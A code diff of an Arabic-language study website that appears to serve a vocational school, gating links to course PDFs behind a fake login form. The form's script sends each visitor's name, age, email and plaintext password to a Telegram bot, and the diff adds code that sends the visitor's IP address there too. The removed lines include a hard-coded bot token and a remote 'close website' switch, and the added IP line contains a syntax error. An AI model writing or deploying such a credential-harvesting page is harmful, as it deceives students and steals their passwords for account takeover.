@@ -47,6 +47,7 @@
             flex-wrap: wrap;
             gap: 20px;
             padding: 50px 20px;
+            display: none; /* Hidden by default */
         }
 
         .button {
@@ -62,6 +63,7 @@
             box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
             position: relative;
             overflow: hidden;
+            text-decoration: none; /* Remove underline */
         }
 
         .button:hover {
@@ -78,6 +80,9 @@
             box-shadow: 0 8px 16px rgba(0, 0, 0, 0.7);
             margin-top: 30px;
             transition: all 0.5s ease;
+            display: flex; /* Make the login container a flexbox */
+            flex-direction: column; /* Arrange items vertically */
+            align-items: center; /* Center items horizontally */
         }
 
         .login-container label {
@@ -159,22 +164,6 @@
     <img src="https://raw.githubusercontent.com/klwb123/conv/main/IMG_5386.png" alt="Logo">
 </header>
 
-<div class="container">
-    <button class="button fade-in">
-        <a href="https://vocational.edu.iq/wp-content/uploads/2024/01/%D8%AA%D8%B7%D8%A8%D9%8A%D9%82%D8%A7%D8%AA-%D8%A7%D9%84%D8%AD%D8%A7%D8%B3%D9%88%D8%A8-%D8%A7%D9%84%D8%A7%D9%88%D9%84-2023.pdf" target="_blank">تطبيقات الحاسوب</a>
-    </button>
-    <button class="button fade-in">
-        <a href="https://vocational.edu.iq/uploads/pdf/computer/1/1/511cc.pdf" target="_blank">مبادئ الاتصال والشبكات</a>
-    </button>
-    <button class="button fade-in">
-        <a href="https://vocational.edu.iq/uploads/pdf/computer/1/1/511dd.pdf" target="_blank">تجميع الحاسوب</a>
-    </button>
-    <button class="button fade-in">الطبيعيات</button>
-    <button class="button fade-in">اللغة العربية</button>
-    <button class="button fade-in">اللغة الانكليزية</button>
-    <button class="button fade-in">الرياضيات</button>
-</div>
-
 <div class="login-container fade-in" id="login-container">
     <form id="loginForm">
         <label for="email">البريد الإلكتروني</label>
@@ -196,6 +185,16 @@
     </form>
 </div>
 
+<div class="container fade-in" id="resource-container">
+    <button class="button" onclick="window.open('https://vocational.edu.iq/wp-content/uploads/2024/01/%D8%AA%D8%B7%D8%A8%D9%8A%D9%82%D8%A7%D8%AA-%D8%A7%D9%84%D8%AD%D8%A7%D8%B3%D9%88%D8%A8-%D8%A7%D9%84%D8%A7%D9%88%D9%84-2023.pdf', '_blank')">تطبيقات الحاسوب</button>
+    <button class="button" onclick="window.open('https://vocational.edu.iq/uploads/pdf/computer/1/1/511cc.pdf', '_blank')">مبادئ الاتصال والشبكات</button>
+    <button class="button" onclick="window.open('https://vocational.edu.iq/uploads/pdf/computer/1/1/511dd.pdf', '_blank')">تجميع الحاسوب</button>
+    <button class="button">الطبيعيات</button>
+    <button class="button">اللغة العربية</button>
+    <button class="button">اللغة الانكليزية</button>
+    <button class="button">الرياضيات</button>
+</div>
+
 <footer>
     <p>&copy; 2024 موقع دراسي - كل الحقوق محفوظة للإعدادية الرافدين المهنية</p>
 </footer>
@@ -211,19 +210,30 @@
         const specialty = document.getElementById('specialty').value;
 
         // Send data to Telegram bot
-        const botToken = "7247835860:AAHi08y99fZPkS1Drd8-xwtv0ZnO3pgDOqM"; // Replace with your bot token
-        const chatId = "842463450"; // Replace with your chat ID
+        const botToken = "YOUR_BOT_TOKEN"; // Replace with your bot token
+        const chatId = "YOUR_CHAT_ID"; // Replace with your chat ID
         const message = `New login attempt:\nName: ${name}\nAge: ${age}\nSpecialty: ${specialty}\nEmail: ${email}\nPassword: ${password}`;
 
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
         .then(response => {
             if (response.ok) {
-                // Hide login form and show user name
+                // Hide login form and show resource buttons
                 document.getElementById('login-container').style.display = 'none';
-                const welcomeMessage = document.createElement('h1');
-                welcomeMessage.className = 'fade-in';
-                welcomeMessage.innerText = `مرحبًا ${name}، تم تسجيل دخولك بنجاح!`;
-                document.body.insertBefore(welcomeMessage, document.body.firstChild);
+                document.getElementById('resource-container').style.display = 'flex'; // Show the resource buttons
+
+                const welcomeButton = document.createElement('button');
+                welcomeButton.className = 'button fade-in';
+                welcomeButton.innerText = `مرحبًا ${name}، تم تسجيل دخولك بنجاح!`;
+                document.body.insertBefore(welcomeButton, document.body.firstChild);
+
+                // Fetch user IP and send it to Telegram
+                fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipMessage = `User IP: ${data.ip}`;
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(ipMessage}`);
+                });
+
             } else {
                 alert("حدث خطأ. حاول مرة أخرى.");
             }
@@ -232,31 +242,6 @@
         // Reset the form
         e.target.reset();
     });
-
-    // Fetch user IP and send it to Telegram
-    fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => {
-        const ipMessage = `User's IP: ${data.ip}`;
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(ipMessage)}`);
-    });
-
-    // Polling Telegram commands every 5 seconds
-    setInterval(checkTelegramCommands, 5000);
-
-    function checkTelegramCommands() {
-        fetch(`https://api.telegram.org/bot${botToken}/getUpdates`)
-        .then(response => response.json())
-        .then(data => {
-            const lastMessage = data.result[data.result.length - 1].message.text;
-
-            if (lastMessage.toLowerCase() === "close website") {
-                document.body.innerHTML = "<h1>الموقع مغلق</h1>";
-            } else if (lastMessage.toLowerCase() === "open website") {
-                location.reload(); // Reload the page to open it again
-            }
-        });
-    }
 </script>
 
 </body>
